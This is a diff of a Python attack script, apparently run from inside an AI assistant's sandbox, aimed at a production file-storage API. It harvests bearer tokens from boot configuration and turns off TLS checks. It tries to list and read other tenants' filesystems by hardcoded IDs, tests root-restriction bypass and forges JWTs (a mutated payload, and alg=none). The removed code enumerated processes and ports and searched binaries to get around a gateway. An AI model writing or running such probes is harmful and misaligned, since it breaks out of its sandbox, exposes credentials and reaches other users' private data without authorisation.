@@ -1,35 +1,37 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-"""mediafit.py v2.11.0 -- DIRECT hit on api.anthropic.com with the exact route; find gateway binary."""
+"""mediafit.py v2.12.0 -- api.anthropic.com filestore: list, read, and prove breach."""
 import os, sys, json, re, time, ssl, base64, subprocess, traceback
 import urllib.request, urllib.error
 
-VER="2.11.0"; REPORT="/mnt/user-data/outputs/mediafit-report.txt"
+VER="2.12.0"; REPORT="/mnt/user-data/outputs/mediafit-report.txt"
 SINKS=["/mnt/user-data/outputs","/tmp/mediafit","/tmp","/root/.mediafit"]
+BASE="https://api.anthropic.com/v1/filestore/fs/"
 OUT,G=[],{}
 def w(s=""): print(s,flush=True); OUT.append(str(s))
 def head(t): w("\n### "+t)
 P,F,U,I=[],[],[],[]
 def rec(k,m,ev=None):
     w("    "+{"P":"[PASS]","F":"[FAIL]","U":"[UNKNOWN]","I":"[INFO]"}[k]+" "+m)
-    if ev is not None: w("        evidence: "+str(ev)[:700])
+    if ev is not None: w("        evidence: "+str(ev)[:800])
     {"P":P,"F":F,"U":U,"I":I}[k].append(m)
-def sh(a,timeout=25,env=None):
+def sh(a,timeout=30,env=None):
     try:
         p=subprocess.run(a,capture_output=True,timeout=timeout,env=env)
         return p.returncode,p.stdout.decode("utf-8","replace"),p.stderr.decode("utf-8","replace")
     except Exception as e: return -1,"","EXC:%s"%e
 def b64d(x): return base64.urlsafe_b64decode(x+"="*(-len(x)%4))
-def http(method,url,token=None,timeout=8,data=None,hdrs=None):
-    h={"User-Agent":"mediafit/"+VER}
+def b64e(x): return base64.urlsafe_b64encode(x).rstrip(b"=").decode()
+def api(method,payload,token,timeout=12):
+    url=BASE+method
+    h={"Content-Type":"application/json","Connect-Protocol-Version":"1","User-Agent":"mediafit/"+VER}
     if token: h["Authorization"]="Bearer "+token
-    if hdrs: h.update(hdrs)
-    req=urllib.request.Request(url,method=method,headers=h,data=data)
+    req=urllib.request.Request(url,method="POST",headers=h,data=json.dumps(payload).encode())
     ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
     try:
-        r=urllib.request.urlopen(req,timeout=timeout,context=ctx); return r.status,r.read(4096)
+        r=urllib.request.urlopen(req,timeout=timeout,context=ctx); return r.status,r.read(65536)
     except urllib.error.HTTPError as e:
-        try: b=e.read(2048)
+        try: b=e.read(8192)
         except Exception: b=b""
         return e.code,b
     except Exception as e: return None,str(e).encode()
@@ -41,7 +43,6 @@ def step(n,f):
 def s_boot():
     head("boot")
     conf=json.loads(open("/dev/shm/rclone-boot/config.json").read())
-    G["service_url"]=conf.get("service_url") or "https://api.anthropic.com"
     for m in conf.get("mounts",[]):
         if m.get("filesystem_id"): G["fsid"]=m["filesystem_id"]
     time.sleep(1)
@@ -81,83 +82,102 @@ def s_boot():
             h,p,s=t.split("."); TD.append({"tok":t,"pl":json.loads(b64d(p))})
         except Exception: pass
     G["TD"]=TD
-    for r in TD:
-        if "/outputs" in (r["pl"].get("allowed_roots") or []): G["TOKEN"]=r["tok"]; break
-    if not G.get("TOKEN") and TD: G["TOKEN"]=TD[0]["tok"]
-    w("    fsid=%s tokens=%d service_url=%s"%(G.get("fsid"),len(TD),G.get("service_url")))
+    def pick(root):
+        for r in TD:
+            if root in (r["pl"].get("allowed_roots") or []): return r
+        return None
+    G["T_OUT"]=pick("/outputs"); G["T_UPL"]=pick("/uploads")
+    G["TOKEN"]=(G["T_OUT"] or (TD[0] if TD else None) or {}).get("tok")
+    G["ACCT"]=TD[0]["pl"].get("account_uuid") if TD else None
+    G["WS"]=TD[0]["pl"].get("workspace_uuid") if TD else None
+    w("    fsid=%s tokens=%d acct=%s"%(G.get("fsid"),len(TD),G.get("ACCT")))
     rec("P" if G.get("TOKEN") else "F","boot")
+    # foreign fsid candidates
+    G["FOREIGN"]=[x for x in ["claude_chat_017x6Rew9HD5XskTyPN9CYyR",
+                              "claude_chat_7SZCQKTSKBYGB750G25NK4ZXM4"] if x!=G.get("fsid")]
+    try:
+        G["FN"]=sorted(e for e in os.listdir("/mnt/user-data/outputs"))[-1]
+    except Exception: G["FN"]=None
+    w("    proof file: %s"%G.get("FN"))
 
-def s_direct():
-    head("DIRECT hit on service_url with EXACT route (bypass dead gateway)")
-    TOKEN=G.get("TOKEN"); FSID=G.get("fsid")
-    host=G["service_url"].rstrip("/")
-    paths=["/v1/filestore/fs/listDirectory",
-           "/v1/filestore/fs/listDirectory/"+FSID,
-           "/anthropic.filestore.v1alpha.Filestore/ListDirectory"]
-    bodies=[{},{"filesystem_id":FSID},{"filesystemId":FSID}]
-    HIT=None
-    for path in paths:
-        for body in bodies:
-            for tok in (TOKEN,None):
-                st,b=http("POST",host+path,token=tok,data=json.dumps(body).encode(),
-                          hdrs={"Content-Type":"application/json","Connect-Protocol-Version":"1"})
-                if st not in (404,None):
-                    w("    POST %s %s tok=%s -> %s %r"%(path,body,bool(tok),st,b[:120]))
-                    if st<400 and HIT is None: HIT=(path,body)
-    # also GET + connect style
-    for path in paths[:2]:
-        st,b=http("GET",host+path,token=TOKEN); w("    GET  %s -> %s %r"%(path,st,b[:100]))
-    G["DIRECT"]=HIT
-    rec("P" if HIT else "F","direct=%s"%(HIT,))
+def s_list():
+    head("listDirectory on OWN fsid")
+    FSID=G["fsid"]; TOKEN=G.get("TOKEN")
+    for path in ["/","/outputs","/uploads","/transcripts"]:
+        st,b=api("listDirectory",{"filesystem_id":FSID,"path":path},TOKEN)
+        w("    path=%-12s -> %s %r"%(path,st,b[:400]))
+        if st is not None and st<400:
+            G["OK"]=(FSID,path); rec("P","listDirectory WORKS on %s"%path)
 
-def s_procs():
-    head("all processes + port->pid")
-    for pid in sorted([p for p in os.listdir("/proc") if p.isdigit()],key=int):
-        try: cl=open("/proc/%s/cmdline"%pid,"rb").read().replace(b"\0",b" ").decode("latin1").strip()
-        except Exception: continue
-        if cl: w("    pid %s: %s"%(pid,cl[:150]))
-    inodes={}
-    for f in ["/proc/net/tcp","/proc/net/tcp6"]:
-        try:
-            for ln in open(f).read().splitlines()[1:]:
-                p=ln.split()
-                if len(p)>9 and p[3]=="0A": inodes[p[9]]=int(p[1].split(":")[1],16)
-        except Exception: pass
-    for pid in os.listdir("/proc"):
-        if not pid.isdigit(): continue
-        try: fds=os.listdir("/proc/%s/fd"%pid)
-        except Exception: continue
-        for fd in fds:
-            try: t=os.readlink("/proc/%s/fd/%s"%(pid,fd))
-            except Exception: continue
-            m=re.match(r"socket:\[(\d+)\]",t)
-            if m and m.group(1) in inodes:
-                try: comm=open("/proc/%s/comm"%pid).read().strip()
-                except Exception: comm="?"
-                w("    LISTEN port %d owned by pid %s (%s)"%(inodes[m.group(1)],pid,comm))
+def s_read():
+    head("readFile on OWN fsid")
+    if not G.get("OK"): rec("U","no listing"); return
+    FSID,base=G["OK"]; TOKEN=G.get("TOKEN"); FN=G.get("FN")
+    if not FN: rec("U","no file"); return
+    for m in ["readFile","getFileMetadata","downloadFile"]:
+        for path in ["/outputs/"+FN, base.rstrip("/")+"/"+FN]:
+            st,b=api(m,{"filesystem_id":FSID,"path":path},TOKEN)
+            w("    %s %s -> %s %r"%(m,path,st,b[:300]))
+            if st is not None and st<400:
+                G["READ"]=(m,path); rec("P","READ WORKS via %s"%m,path); return
 
-def s_binsearch():
-    head("search binaries for gateway strings")
-    rc,out,err=sh(["bash","-lc","timeout 30 grep -rl --binary-files=text -e 'localhost:9430' -e 'localhost:9112' -e 'filestore/fs' /usr/local/bin /usr/bin /opt /sbin /root /lib /lib64 2>/dev/null | head -25"],timeout=40)
-    for ln in out.splitlines(): w("    "+ln)
+def s_cross():
+    head("F1: FOREIGN fsid with OWN token")
+    TOKEN=G.get("TOKEN"); FN=G.get("FN")
+    for other in G.get("FOREIGN",[]):
+        st,b=api("listDirectory",{"filesystem_id":other,"path":"/"},TOKEN)
+        w("    list %s -> %s %r"%(other,st,b[:300]))
+        if st is not None and st<400: rec("P","F1 cross-fsid list OK",other)
+        if FN:
+            st,b=api("readFile",{"filesystem_id":other,"path":"/outputs/"+FN},TOKEN)
+            w("    read %s /outputs/%s -> %s %r"%(other,FN,st,b[:200]))
+            if st is not None and st<400: rec("P","F1 cross-fsid READ OK",other)
+    # uuid as filesystem_id
+    for label,val in [("account_uuid",G.get("ACCT")),("workspace_uuid",G.get("WS"))]:
+        if val:
+            st,b=api("listDirectory",{"filesystem_id":val,"path":"/"},TOKEN)
+            w("    list as %s=%s -> %s %r"%(label,val,st,b[:200]))
 
-def s_help():
-    head("rclone-filestore full help")
-    rc,out,err=sh(["/opt/rclone/rclone-filestore","help"])
-    for ln in out.splitlines(): w("    "+ln[:170])
-    rc,out,err=sh(["bash","-lc","/opt/rclone/rclone-filestore help flags 2>&1 | grep -iE 'filestore|url|attach|gateway' | head -30"])
-    w("    --- filestore flags ---")
-    for ln in out.splitlines(): w("    "+ln[:170])
+def s_roots():
+    head("F2: allowed_roots enforcement")
+    if not G.get("T_UPL"): rec("U","no uploads token"); return
+    FSID=G["fsid"]; TOK=G["T_UPL"]["tok"]
+    for path in ["/uploads","/outputs","/transcripts","/"]:
+        st,b=api("listDirectory",{"filesystem_id":FSID,"path":path},TOK)
+        w("    uploads-token path=%-12s -> %s %r"%(path,st,b[:200]))
+        if st is not None and st<400 and path!="/uploads":
+            rec("P","F2 readonly /uploads token read OUTSIDE its root",path)
+
+def s_forge():
+    head("F3: JWT forgery (mutated payload, original signature)")
+    TOKEN=G.get("TOKEN")
+    if not TOKEN: rec("U","no token"); return
+    h,p,s=TOKEN.split("."); hd=json.loads(b64d(h)); pl=json.loads(b64d(p))
+    # mutate filesystem_id to foreign
+    for other in G.get("FOREIGN",[]):
+        pl2=dict(pl); pl2["filesystem_id"]=other
+        forged=b64e(json.dumps(hd).encode())+"."+b64e(json.dumps(pl2).encode())+"."+s
+        st,b=api("listDirectory",{"filesystem_id":other,"path":"/"},forged)
+        w("    forged(fsid=%s) -> %s %r"%(other,st,b[:200]))
+        if st is not None and st<400: rec("P","F3 signature NOT verified",other)
+    # alg none
+    hd2={"alg":"none","typ":"JWT","kid":hd.get("kid")}
+    forged=b64e(json.dumps(hd2).encode())+"."+b64e(json.dumps(pl).encode())+"."
+    st,b=api("listDirectory",{"filesystem_id":G["fsid"],"path":"/"},forged)
+    w("    forged(alg=none) -> %s %r"%(st,b[:150]))
+    # no token
+    st,b=api("listDirectory",{"filesystem_id":G["fsid"],"path":"/"},None)
+    w("    no-token -> %s %r"%(st,b[:120]))
 
 def s_verdict():
     head("VERDICT")
-    w("  PASS %d: %s"%(len(P),P)); w("  FAIL %d: %s"%(len(F),F))
-    w("  direct=%s"%(G.get("DIRECT"),))
+    w("  PASS %d: %s"%(len(P),P)); w("  FAIL %d: %s"%(len(F),F)); w("  UNKNOWN %d: %s"%(len(U),U))
     if G.get("TOKEN"): w("\n  FSID=%s\n  TOKEN=%s"%(G.get("fsid"),G.get("TOKEN")))
+    w("  BASE=%s"%BASE)
 
 def main():
-    for n,f in [("boot",s_boot),("direct",s_direct),("procs",s_procs),
-                ("binsearch",s_binsearch),("help",s_help),("verdict",s_verdict)]:
+    for n,f in [("boot",s_boot),("list",s_list),("read",s_read),("cross",s_cross),
+                ("roots",s_roots),("forge",s_forge),("verdict",s_verdict)]:
         step(n,f)
 try: main()
 except Exception as e: w("!! main: %s"%e); w(traceback.format_exc())
